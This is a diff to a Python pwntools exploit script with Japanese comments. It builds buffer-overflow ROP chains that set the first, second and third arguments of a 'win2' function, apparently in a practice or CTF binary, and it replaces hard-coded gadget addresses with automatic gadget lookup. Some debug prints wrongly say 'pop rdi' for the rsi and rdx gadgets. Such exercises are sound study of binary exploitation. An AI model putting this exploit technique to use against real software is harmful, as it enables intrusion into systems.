@@ -15,22 +15,28 @@ rop = ROP(binf)
 
 # 第一引数書き換え
 def attack_35_27(conn, **kwargs):
+    rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])
+    print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
     exploit =  b'a' * 0x10
-    exploit += struct.pack('<QQQQ', 0xdeadbeef, 0x401288, 0xcafebabe, 0x4011da)
+    exploit += struct.pack('<QQQQ', 0xdeadbeef, rdi_gadget.address, 0xcafebabe, binf.functions['win2'].address)
     conn.sendline(exploit)
     print(conn.recvall().decode())
 
 # 第二引数書き換え
 def attack_35_27_2(conn, **kwargs):
+    rdi_gadget = rop.find_gadget(['pop rsi', 'ret'])
+    print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
     exploit =  b'a' * 0x10
-    exploit += struct.pack('<QQQQ', 0xdeadbeef, 0x401290, 0xcafebabe, 0x4011da)
+    exploit += struct.pack('<QQQQ', 0xdeadbeef, rdi_gadget.address, 0xcafebabe, binf.functions['win2'].address)
     conn.sendline(exploit)
     print(conn.recvall().decode())
 
 # 第三引数書き換え
 def attack_35_27_3(conn, **kwargs):
+    rdi_gadget = rop.find_gadget(['pop rdx', 'ret'])
+    print(f"Found pop rdi; ret at: {hex(rdi_gadget.address)}")
     exploit =  b'a' * 0x10
-    exploit += struct.pack('<QQQQ', 0xdeadbeef, 0x401298, 0xcafebabe, 0x4011da)
+    exploit += struct.pack('<QQQQ', 0xdeadbeef, rdi_gadget.address, 0xcafebabe, binf.functions['win2'].address)
     conn.sendline(exploit)
     print(conn.recvall().decode())
 
